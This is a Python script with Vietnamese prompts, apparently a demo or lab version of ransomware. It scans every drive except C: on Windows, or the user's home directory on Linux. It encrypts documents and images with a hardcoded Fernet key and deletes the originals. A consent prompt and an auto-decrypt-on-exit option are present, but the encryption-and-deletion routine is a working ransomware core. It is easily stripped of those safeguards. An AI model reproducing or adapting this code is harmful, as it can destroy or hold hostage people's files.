import os
import sys
import platform
import string
from cryptography.fernet import Fernet, InvalidToken

# --- CẤU HÌNH ---
# Khóa phải có tiền tố 'b' và đủ định dạng của Fernet
KEY =  b'Y9pBIdbiTPQ5_Mj4cYG1o89Drw2gk3Qzrks9Z_1K6JY='
FERNET = Fernet(KEY)

# Các đuôi file được phép xử lý
ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.pdf', '.docx', '.png'}

def get_drives_or_paths():
    """Tự động lấy danh sách đường dẫn quét an toàn"""
    if platform.system() == "Windows":
        # Quét tất cả ổ đĩa trừ ổ C (ổ hệ thống) để tránh lỗi
        return [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\') and d != 'C']
    else:
        # Trên Linux/Kali, quét thư mục Home của user
        return [os.path.expanduser("~")]

def process_files(mode='encrypt'):
    """Quét và xử lý file với cơ chế xử lý lỗi chặt chẽ"""
    paths = get_drives_or_paths()
    print(f"[*] Bắt đầu chế độ: {mode.upper()}...")
    
    for base_path in paths:
        for root, dirs, files in os.walk(base_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                ext = os.path.splitext(filename)[1].lower()
                
                try:
                    # Logic Mã hóa
                    if mode == 'encrypt' and ext in ALLOWED_EXTENSIONS and not filename.endswith(".encrypted"):
                        with open(file_path, "rb") as f: data = f.read()
                        with open(file_path + ".encrypted", "wb") as f: 
                            f.write(FERNET.encrypt(data))
                        os.remove(file_path)
                    
                    # Logic Giải mã
                    elif mode == 'decrypt' and filename.endswith(".encrypted"):
                        with open(file_path, "rb") as f: data = f.read()
                        new_path = file_path.replace(".encrypted", "")
                        with open(new_path, "wb") as f: 
                            f.write(FERNET.decrypt(data))
                        os.remove(file_path)
                except (PermissionError, InvalidToken):
                    # Bỏ qua file hệ thống hoặc file lỗi khóa
                    continue
                except Exception:
                    continue
    print(f"[*] Hoàn thành thao tác: {mode.upper()}")

def main():
    print("--- CHƯƠNG TRÌNH XỬ LÝ FILE TOÀN HỆ THỐNG ---")
    print("CẢNH BÁO: Chương trình này quét toàn bộ dữ liệu người dùng.")
    print("Bạn cam kết chịu hoàn toàn trách nhiệm cá nhân về dữ liệu của mình.")
    
    confirm = input("Đồng ý với điều khoản? (y/n): ").lower()
    if confirm != 'y':
        print("-> Dừng chương trình.")
        return

    while True:
        print("\n--- MENU ---")
        print("1. Mã hóa toàn bộ file")
        print("2. Giải mã toàn bộ file")
        print("3. Thoát (Tự động giải mã toàn bộ trước khi thoát)")
        
        choice = input("Chọn: ")
        
        if choice == '1': 
            process_files(mode='encrypt')
        elif choice == '2': 
            process_files(mode='decrypt')
        elif choice == '3': 
            print("\n[*] Đang thực hiện tự động giải mã trước khi thoát...")
            process_files(mode='decrypt')
            print("[*] Đã hoàn tất giải mã. Tạm biệt!")
            break # Thoát chương trình
        else:
            print("Lựa chọn không hợp lệ.")

if __name__ == "__main__":
    main()
